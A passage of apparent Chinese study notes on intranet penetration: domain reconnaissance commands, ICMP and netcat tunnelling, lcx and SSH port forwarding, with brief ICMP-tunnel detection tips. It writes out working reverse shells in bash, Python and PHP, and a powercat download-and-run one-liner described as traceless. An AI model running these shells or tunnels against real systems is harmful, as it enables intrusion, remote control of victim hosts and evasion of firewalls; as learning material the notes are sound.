+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net localgroup administrators</span><br></pre></td></tr></table></figure>
+
+<p>查看在线用户：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">query user || qwinsta</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>注：qwinsta是Query Windows STAtion的简称，为一个用户会话管理程序 </p>
+</blockquote>
+<p>查看会话：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net session</span><br></pre></td></tr></table></figure>
+
+<p>查看端口列表(很常用!)：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netstat -ano</span><br></pre></td></tr></table></figure>
+
+<p>查看补丁列表</p>
+<ol>
+<li>通过系统详细信息列出:</li>
+</ol>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">systeminfo</span><br></pre></td></tr></table></figure>
+
+<ol start="2">
+<li>利用wmic</li>
+</ol>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmic qfe Caption,Description,HotFixID,InstalledOn</span><br></pre></td></tr></table></figure>
+
+<p>查看本机共享列表：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">net share </span><br><span class="line">wmic share get name,path,status</span><br></pre></td></tr></table></figure>
+
+<p>查看路由表以及所有可用接口的<em>arp</em>缓存表：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">route <span class="built_in">print</span> </span><br><span class="line">arp -a</span><br></pre></td></tr></table></figure>
+
+<h4 id="自动信息收集"><a href="#自动信息收集" class="headerlink" title="自动信息收集"></a>自动信息收集</h4><p>主要有两个软件：Wmic和Empire。</p>
+<h5 id="wmic"><a href="#wmic" class="headerlink" title="wmic"></a>wmic</h5><p>Windows命令行工具，一些收集信息的脚本会利用该工具查询信息</p>
+<h5 id="Empire"><a href="#Empire" class="headerlink" title="Empire"></a>Empire</h5><p>提供了用于收集主机信息的模块</p>
+<h2 id="2-查看当前权限"><a href="#2-查看当前权限" class="headerlink" title="2. 查看当前权限"></a>2. 查看当前权限</h2><p>查看权限和用户：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">whoami</span></span><br></pre></td></tr></table></figure>
+
+<p>用户及权限的表示： </p>
+<ul>
+<li>本地普通用户：主机名&#x2F;用户名</li>
+<li>本地管理员用户：主机名&#x2F;Administrator</li>
+<li>域内用户：域名&#x2F;用户名</li>
+</ul>
+<p>获取域SID:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">whoami</span> /all</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>SID 的全称是安全标识符（Security Identify），是为域或本地计算机中创建的每个<em>帐户</em>分配的唯一的ID字符串。</p>
+</blockquote>
+<p>查看指定用户详细信息：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net user &lt;用户名&gt;/domain</span><br></pre></td></tr></table></figure>
+
+<h2 id="3-判断是否存在域"><a href="#3-判断是否存在域" class="headerlink" title="3. 判断是否存在域"></a>3. 判断是否存在域</h2><p>有多种方法：</p>
+<ol>
+<li>利用<code>ipconfig</code>：查看网关，DNS，域名，本机，本机是否与DNS服务器在同一网段；</li>
+<li>利用<code>systeminfo</code>：域为域名还是WORKGROUP；</li>
+<li>利用当前登录域或登录用户的信息：<code>net config workstation</code>。判断工作站DNS域名称是域名还是WORKGROUP，或者登录域是域用户还是本地用户；</li>
+<li>查看时间<code>net time /domain</code></li>
+</ol>
+<p>原理：域服务器通常也作为<em>时间同步服务器</em> </p>
+<p>判断方式: </p>
+<ul>
+<li>存在域，但当前不是域用户：发生系统错误5 </li>
+<li>存在域，且当前用户是域用户：显示时间 </li>
+<li>当前为工作组，不存在域：找不到域控</li>
+</ul>
+<h2 id="4-探测域内存活主机"><a href="#4-探测域内存活主机" class="headerlink" title="4. 探测域内存活主机"></a>4. 探测域内存活主机</h2><h3 id="1）NetBIOS探测内网"><a href="#1）NetBIOS探测内网" class="headerlink" title="1）NetBIOS探测内网"></a>1）NetBIOS探测内网</h3><p>概念：</p>
+<ul>
+<li>NetBIOS是局域网程序使用的一种<em>API</em>，几乎所有的局域网都是在NetBIOS协议的基础上工作的。 </li>
+<li>NetBIOS也是计算机的标识名，主要用于局域网中计算机的互访。 </li>
+<li>NetBIOS的工作流程就是正常的机器名解析査询应答过程</li>
+</ul>
+<p>工具：nbtscan </p>
+<p>使用：用于扫描本地或远程TCP&#x2F;IP网络上的开放NetBIOS名称服务器</p>
+<h3 id="2）利用ICMP扫描"><a href="#2）利用ICMP扫描" class="headerlink" title="2）利用ICMP扫描"></a>2）利用ICMP扫描</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> /L %I <span class="keyword">in</span> (1,1,254) DO @ping -w 1 -n 1 192.168.1.%I | findstr <span class="string">&quot;TTL=&quot;</span></span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>注解： </p>
+<p>for &#x2F;L %I in (1,1,254) do 构造了一段循环，&#x2F;L指循环（loop） </p>
+<p>前半段为固定的格式，类似于C中的for(i&#x3D;1;i&lt;&#x3D;254;i&#x3D;i+1) DO后面跟着的是执行的语句 </p>
+<p>-w -1是超时时间设置为1ms </p>
+<p>-n -1是只发送一个包 </p>
+<p>目的ip的最后8位被循环变量代替，以循环遍历所有C段IP</p>
+<p>最后通过管道将结果利用findstr命令过滤，只显示可以ping通的IP </p>
+<p>@用于隐藏ping命令自身的回显</p>
+</blockquote>
+<p>使用vbs脚本:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cscript &lt;脚本文件名&gt;</span><br></pre></td></tr></table></figure>
+
+<h2 id="5-扫描域内端口"><a href="#5-扫描域内端口" class="headerlink" title="5. 扫描域内端口"></a>5. 扫描域内端口</h2><h3 id="使用Telnet命令"><a href="#使用Telnet命令" class="headerlink" title="使用Telnet命令"></a>使用Telnet命令</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">telnet &lt;主机&gt; &lt;端口&gt;</span><br></pre></td></tr></table></figure>
+
+<p>如果只是想快速探测某台主机的某个常规高危端口是否开放，使用telnet命令最方便。</p>
+<h3 id="Metasploit端口扫描"><a href="#Metasploit端口扫描" class="headerlink" title="Metasploit端口扫描"></a>Metasploit端口扫描</h3><p>Metasploit在内网渗透很常用。</p>
+<p>启动：<code>msfconsole</code></p>
+<p>使用指定模块：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">use &lt;模块名&gt;</span><br></pre></td></tr></table></figure>
+
+<p>如</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">use auxiliary/scanner/portscan/tcp</span><br></pre></td></tr></table></figure>
+
+<p>显示设置：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">show options</span><br></pre></td></tr></table></figure>
+
+<p>设置端口：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">set</span> port &lt;端口号范围&gt; </span><br></pre></td></tr></table></figure>
+
+<p>设置远程目的IP: </p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">set</span> rhosts</span><br></pre></td></tr></table></figure>
+
+<p>设置线程数：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">set</span> threads &lt;线程数量&gt; </span><br></pre></td></tr></table></figure>
+
+<p>运行:<code>run</code></p>
+<h3 id="端口Banner信息"><a href="#端口Banner信息" class="headerlink" title="端口Banner信息"></a>端口Banner信息</h3><p>常见的开发端口、协议以及漏洞利用：</p>
+<p><img src="/../images/image-20240610162219215.png" alt="image-20240610162219215"></p>
+<p><img src="/../images/image-20240610162227334.png" alt="image-20240610162227334"></p>
+<p><img src="/../images/image-20240610162237517.png" alt="image-20240610162237517"></p>
+<h2 id="6-收集域内信息"><a href="#6-收集域内信息" class="headerlink" title="6. 收集域内信息"></a>6. 收集域内信息</h2><p>查询域：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net view /domain</span><br></pre></td></tr></table></figure>
+
+<p>查询域内计算机：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net view /domain:&lt;域名&gt;</span><br></pre></td></tr></table></figure>
+
+<p>查询域内所有用户组列表：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net group /domain</span><br></pre></td></tr></table></figure>
+
+<p>查询所有域成员计算机列表：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net group <span class="string">&quot;domain computers&quot;</span> /domain</span><br></pre></td></tr></table></figure>
+
+<p>获取域密码信息：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net accounts /domain</span><br></pre></td></tr></table></figure>
+
+<p>获取域信任信息：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nltest /domain_trusts</span><br></pre></td></tr></table></figure>
+
+<h2 id="7-查找域控制器"><a href="#7-查找域控制器" class="headerlink" title="7. 查找域控制器"></a>7. 查找域控制器</h2><p>查看域控机器名称：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nltest /DCLIST:&lt;域名&gt;</span><br><span class="line">netdom query pdc</span><br></pre></td></tr></table></figure>
+
+<p>查看域控主机名：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nslookup -type=SRV_ldap._tcp</span><br></pre></td></tr></table></figure>
+
+<p>查看当前时间：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net time /domain</span><br></pre></td></tr></table></figure>
+
+<p>查看域控组：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net group <span class="string">&quot;Domain Controllers&quot;</span> /domain</span><br></pre></td></tr></table></figure>
+
+<h2 id="8-获取域内用户和管理员信息"><a href="#8-获取域内用户和管理员信息" class="headerlink" title="8. 获取域内用户和管理员信息"></a>8. 获取域内用户和管理员信息</h2><h3 id="查询域用户列表"><a href="#查询域用户列表" class="headerlink" title="查询域用户列表"></a>查询域用户列表</h3><p>向域控制器查询<strong>用户列表</strong>：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net user /domain</span><br></pre></td></tr></table></figure>
+
+<p>获取域内用户详细信息：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmic useraccount get /all</span><br></pre></td></tr></table></figure>
+
+<p>查看存在的用户:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dsquery user</span><br></pre></td></tr></table></figure>
+
+<p>查询本地管理员组用户：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net localgroup administrators</span><br></pre></td></tr></table></figure>
+
+<h3 id="查询域管理员用户组"><a href="#查询域管理员用户组" class="headerlink" title="查询域管理员用户组"></a>查询域管理员用户组</h3><p>查询域管理员用户：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net group <span class="string">&quot;domain admins&quot;</span> /domain</span><br></pre></td></tr></table></figure>
+
+<p>查询管理员用户组:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net group <span class="string">&quot;Enterprise Admins&quot;</span> /domain</span><br></pre></td></tr></table></figure>
+
+<h2 id="9-定位域管理员"><a href="#9-定位域管理员" class="headerlink" title="9. 定位域管理员"></a>9. 定位域管理员</h2><p>主要工具：</p>
+<ul>
+<li>psloggedon.exe </li>
+<li>PVEFindADUser.exe </li>
+<li>NetView </li>
+<li>Nmap的NSE脚本</li>
+</ul>
+<p>Nmap中有<code>smb-enum-sessions.nse</code>引擎用于获取远程机器的登录会话。</p>
+<p>使用：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">smb-enum-&lt;收集信息&gt;.nse </span><br></pre></td></tr></table></figure>
+
+<p>&lt;收集信息&gt;选项包括： </p>
+<ol>
+<li>domains(域控主机) </li>
+<li>users(域用户信息) </li>
+<li>shares(共享目录) </li>
+<li>processes(系统进程，运行软件) </li>
+<li>sessions(登录会话，登录状态)</li>
+</ol>
+<p>此外还有命令：smb-os-discovery.nse (目标主机信息)</p>
+<h2 id="10-查找域管理进程"><a href="#10-查找域管理进程" class="headerlink" title="10. 查找域管理进程"></a>10. 查找域管理进程</h2><p>获取域管理员列表：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net group <span class="string">&quot;Domain Admins&quot;</span> /domain </span><br></pre></td></tr></table></figure>
+
+<p>列出本机所有进程以及进程用户</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tasklist /v</span><br></pre></td></tr></table></figure>
+
+<h1 id="第三章-隐藏隧道通信技术"><a href="#第三章-隐藏隧道通信技术" class="headerlink" title="第三章 隐藏隧道通信技术"></a>第三章 隐藏隧道通信技术</h1><h2 id="隐藏隧道通信基础"><a href="#隐藏隧道通信基础" class="headerlink" title="隐藏隧道通信基础"></a>隐藏隧道通信基础</h2><p><em>隐藏隧道技术</em>用于在访问受限制网络环境中追踪数据流向和在非受信任网络中实现安全的数据传输。</p>
+<p>隧道：是一种绕过防火墙端口屏蔽的方式，在防火墙两端将数据包封装进合法的数据包中传输。</p>
+<blockquote>
+<p>常用网络隧道：</p>
+<ul>
+<li>网络层：IPv6, ICMP, GRE隧道</li>
+<li>传输层：TCP, UDP隧道, 常规端口转发</li>
+<li>应用层：SSH, HTTP, HTTPS, DNS隧道</li>
+</ul>
+</blockquote>
+<h3 id="判断内网联通性"><a href="#判断内网联通性" class="headerlink" title="判断内网联通性"></a>判断内网联通性</h3><p>主要有四种协议可以判断：</p>
+<ul>
+<li>ICMP：ping</li>
+<li>TCP：netcat</li>
+<li>HTTP：curl or wegt</li>
+<li>DNS：nslookup or dig</li>
+</ul>
+<h2 id="网络层隧道"><a href="#网络层隧道" class="headerlink" title="网络层隧道"></a>网络层隧道</h2><h3 id="IPv6隧道"><a href="#IPv6隧道" class="headerlink" title="IPv6隧道"></a>IPv6隧道</h3><p>利用将IPv6报文整体封装进IPv4数据部分，用IPv4隧道传输IPv6数据。</p>
+<p>大部分防火墙和边界设备无法识别IPv6的通信数据。</p>
+<h3 id="ICMP隧道"><a href="#ICMP隧道" class="headerlink" title="ICMP隧道"></a>ICMP隧道</h3><h4 id="PingTunnel"><a href="#PingTunnel" class="headerlink" title="PingTunnel"></a>PingTunnel</h4><blockquote>
+<p>参数说明：</p>
+<ul>
+<li>-x：指定隧道连接密码</li>
+<li>-p：要监听的本地TCP端口</li>
+<li>-da：指定要转发的目标机器IP</li>
+<li>-dp：指定要转发的目标机器的TCP端口</li>
+<li>-p：指定另一端机器的IP</li>
+</ul>
+</blockquote>
+<p>特点：</p>
+<ul>
+<li>将数据封装在ping包中以穿过防火墙 </li>
+<li>基于网络层协议ICMP </li>
+<li>可以设置密码</li>
+</ul>
+<p>使用：</p>
+<p>开启隧道并设置密码：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ptunnel -x &lt;密码&gt;</span><br></pre></td></tr></table></figure>
+
+<p>设置隧道方向：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ptunnel -p &lt;代理服务器IP&gt; -lp &lt;本机监听端口&gt; -da &lt;靶机地址&gt; -dp &lt;靶机端口&gt; - x &lt;密码&gt; </span><br></pre></td></tr></table></figure>
+
+<p>效果是通过代理服务器，将VPS的端口与靶机对应的端口连在一块，使得vps可以访问内网对应的端口。</p>
+<p>注意：需要代理服务器具有双网卡，既联通外网也联通内网，本机处于外网。</p>
+<h5 id="防范方法"><a href="#防范方法" class="headerlink" title="防范方法"></a>防范方法</h5><p>检测同一来源的ICMP数据包的数量。</p>
+<p>一个正常的ping命令每秒最多发送两个数据包，而使用ICMP 隧道的浏览器会在很短的时间内产生上千个ICMP数据包。 </p>
+<p>注意那些Payload大于64bit的ICMP数据包。 </p>
+<p>寻找响应数据包中的Payload与请求数据包中的Payload不一致的ICMP数据包。 </p>
+<p>检查ICMP数据包的协议标签<em>特征</em>。例如，icmptunnel会在所有的ICMP Payload前面添加“TUNL”标记来标识隧道。</p>
+<h2 id="传输层隧道"><a href="#传输层隧道" class="headerlink" title="传输层隧道"></a>传输层隧道</h2><p>主要基于TPC和UDP协议实现隧道通信。</p>
+<h3 id="lcx端口转发"><a href="#lcx端口转发" class="headerlink" title="lcx端口转发"></a>lcx端口转发</h3><p>作用：</p>
+<ol>
+<li>内网端口转发：将内网机器的数据转发到公网VPS上 </li>
+<li>本地端口映射：将本地无法通过防火墙的端口转发到防火墙允许的端口</li>
+</ol>
+<p>用法：</p>
+<ul>
+<li>内网端口转发</li>
+</ul>
+<p>在目标机器执行：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lcx.exe -salve &lt;外网VPS-IP&gt; 4444 127.0.0.1 3389</span><br></pre></td></tr></table></figure>
+
+<p>在外网VPS上执行：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lcx.exe -listen 4444 5555</span><br></pre></td></tr></table></figure>
+
+<p>此时将目标机器上的3389端口数据经过VPS的4444端口转发到了VPS的5555端口，直接访问VPS:5555即可远程登录目标主机。</p>
+<ul>
+<li>本地端口映射</li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lcx.exe -tran &lt;允许的端口&gt; &lt;靶机ip&gt; &lt;目的端口&gt; </span><br></pre></td></tr></table></figure>
+
+<p>在目标机器上执行，可以目的端口映射到防火墙允许的端口。例如将3389映射到DNS解析的53，此时再用上面内网端口转发就能把数据顺利通过防火墙转发出去。</p>
+<h3 id="netcat"><a href="#netcat" class="headerlink" title="netcat"></a>netcat</h3><blockquote>
+<p>命令参数：</p>
+<ul>
+<li><p>-c:执行shell命令</p>
+</li>
+<li><p>-e:程序重定向</p>
+</li>
+<li><p>-d:后台模式</p>
+</li>
+<li><p>-l:监听模式</p>
+</li>
+<li><p>-n:直接使用IP地址</p>
+</li>
+<li><p>-p:设置本地使用的通信端口</p>
+</li>
+<li><p>-v:信息输出</p>
+</li>
+<li><p>-u:使用UDP传输数据</p>
+</li>
+</ul>
+</blockquote>
+<h4 id="一般用法"><a href="#一般用法" class="headerlink" title="一般用法"></a>一般用法</h4><p>banner抓取：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -nv &lt;靶机ip&gt; &lt;靶机端口&gt; </span><br></pre></td></tr></table></figure>
+
+<p>链接远程主机:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -nvv &lt;靶机ip&gt; &lt;靶机端口&gt; </span><br></pre></td></tr></table></figure>
+
+<p>端口扫描：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nc -v &lt;靶机ip&gt; &lt;靶机端口&gt;</span><br><span class="line">nc -v -z &lt;靶机ip&gt; &lt;端口范围&gt; （用于批量扫描）</span><br></pre></td></tr></table></figure>
+
+<p>端口监听:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -l -p &lt;本地端口&gt; </span><br></pre></td></tr></table></figure>
+
+<p>文件传输:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nc -vn &lt;目的IP&gt; &lt;目的端口&gt; &lt;【这个是输入重定向】&lt;文件名&gt; -q -1  <span class="comment"># 发送 </span></span><br><span class="line">nc -l -p &lt;本地端口&gt; &gt;【这个是输出重定向】&lt;文件名&gt;  <span class="comment"># 接收</span></span><br></pre></td></tr></table></figure>
+
+<p>简易聊天：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nc -l -p &lt;本地端口&gt; </span><br><span class="line">nc -vn &lt;目的IP&gt; &lt;目的端口&gt;</span><br></pre></td></tr></table></figure>
+
+<h4 id="获取Shell"><a href="#获取Shell" class="headerlink" title="获取Shell"></a>获取Shell</h4><p>有两种获取shell的方式：</p>
+<ol>
+<li>客户端连接服务器，<em>客户端</em>想要获取<em>服务器</em>的shell，称为正向Shell</li>
+<li>客户端连接服务器，服务器想要获取客户端的shell，称为<strong>反向Shell</strong></li>
+</ol>
+<h5 id="正向Shell"><a href="#正向Shell" class="headerlink" title="正向Shell"></a>正向Shell</h5><p>目标主机监听端口：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nc -lvp &lt;端口&gt; -e /bin/sh</span><br><span class="line">nc -lvp &lt;端口&gt; -e C:\windows\system32\cmd.exe</span><br></pre></td></tr></table></figure>
+
+<p>攻击机连接：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc &lt;攻击机ip&gt; &lt;攻击机端口&gt;</span><br></pre></td></tr></table></figure>
+
+<h5 id="反向Shell"><a href="#反向Shell" class="headerlink" title="反向Shell"></a>反向Shell</h5><p>攻击机监听：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvp 4444</span><br></pre></td></tr></table></figure>
+
+<p>目标机器连接：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc &lt;攻击机ip&gt; &lt;攻击机端口&gt; -e &lt;shell程序路径&gt;</span><br></pre></td></tr></table></figure>
+
+<p>注意这里是目标主机的shell路径。</p>
+<h5 id="其他反弹Shell方式"><a href="#其他反弹Shell方式" class="headerlink" title="其他反弹Shell方式"></a>其他反弹Shell方式</h5><ol>
+<li><code>bash</code>反弹shell:</li>
+</ol>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/tcp/&lt;攻击机ip&gt;/&lt;攻击机端口&gt; 0&gt;&amp;1</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>-i：交互模式使用bash</li>
+<li>&gt;&amp;：bash输出重定向到后面的文件（Linux一切皆文件，tcp设备socket也是文件），&amp;的作用是将<strong>报错也重定向</strong></li>
+<li>0&gt;&amp;1：输入重定向到输出</li>
+</ul>
+<ol start="2">
+<li><code>python</code>反弹shell</li>
+</ol>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> socket,subprocess,os</span><br><span class="line">s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)</span><br><span class="line">s.connect((<span class="string">&quot;192.168.1.4&quot;</span>,<span class="number">2222</span>))</span><br><span class="line">os.dup2(s.fileno(),<span class="number">0</span>)</span><br><span class="line">os.dup2(s.fileno(),<span class="number">1</span>)</span><br><span class="line">os.dup2(s.fileno(),<span class="number">2</span>)</span><br><span class="line">p = subprocess.call([<span class="string">&quot;/bin/sh&quot;</span>,<span class="string">&quot;-i&quot;</span>])</span><br></pre></td></tr></table></figure>
+
+<ol start="3">
+<li>php反弹shell</li>
+</ol>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php -r <span class="string">&#x27;$sock=fsockopen(&quot;&lt;攻击机ip&gt;&quot;,&lt;攻击机端口&gt;)；exec(&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<p>即：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$sock</span>=<span class="title function_ invoke__">fsockopen</span>(<span class="string">&quot;&lt;攻击机ip&gt;&quot;</span>,&lt;攻击机端口&gt;)；</span><br><span class="line"><span class="title function_ invoke__">exec</span>(<span class="string">&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;</span>);</span><br></pre></td></tr></table></figure>
+
+<h4 id="内网代理"><a href="#内网代理" class="headerlink" title="内网代理"></a>内网代理</h4><p>VPS监听端口：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvp &lt;vps端口&gt;</span><br></pre></td></tr></table></figure>
+
+<p>数据库（内网）服务器监听端口：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvp &lt;内网端口&gt; -e /bin/sh</span><br></pre></td></tr></table></figure>
+
+<p>边界服务器(内网暴露在外网的Web服务器)：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -v -c <span class="string">&quot;nc -v &lt;内网地址&gt; &lt;内网端口&gt;&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p>此时VPS就与内网服务器建立了连接。</p>
+<h3 id="powercat"><a href="#powercat" class="headerlink" title="powercat"></a>powercat</h3><p>powershell版本的nc。</p>
+<p>优势是可以远程加载到内存执行：</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell <span class="built_in">IEX</span> (<span class="built_in">New-Object</span> System.Net.Webclient).DownloadString(<span class="string">&#x27;https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1&#x27;</span>); powercat <span class="literal">-c</span> &lt;host&gt; <span class="literal">-p</span> <span class="number">4444</span> <span class="literal">-e</span> cmd</span><br></pre></td></tr></table></figure>
+
+<p>且不会对硬盘做操作，无痕迹。</p>
+<h2 id="应用层隧道"><a href="#应用层隧道" class="headerlink" title="应用层隧道"></a>应用层隧道</h2><h3 id="SSH"><a href="#SSH" class="headerlink" title="SSH"></a>SSH</h3><p>概念：SSH为建⽴在应⽤层基础上的安全协议。SSH是较可靠，专为远程登录会话和其他⽹络服务提供安全性的协议。</p>
+<blockquote>
+<p>参数：</p>
+<ul>
+<li>-C:压缩传输，提高传输效率</li>
+<li>-f:后台执行SSH</li>
+<li>-N:静默连接</li>
+<li>-g:允许远程主机连接本地用于转发端口</li>
+<li>-L:本地端口转发</li>
+<li>-R:远程端口转发</li>
+<li>-D:动态转发</li>
+<li>-P:执行端口</li>
+</ul>
+</blockquote>
+<p>实际上前四个-CfNg就是默认配置，一般一起使用。</p>
+<h4 id="本地转发"><a href="#本地转发" class="headerlink" title="本地转发"></a>本地转发</h4><p>环境：VPS可以访问Web服务器（跳板机），但不能访问内网主机，需要Web服务器转发到内网。</p>
+<p><strong>在VPS上执行</strong>：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh -CfNg -L &lt;vps端口&gt;:&lt;靶机ip&gt;:&lt;靶机端口&gt; root@&lt;跳板机ip&gt;</span><br></pre></td></tr></table></figure>
+
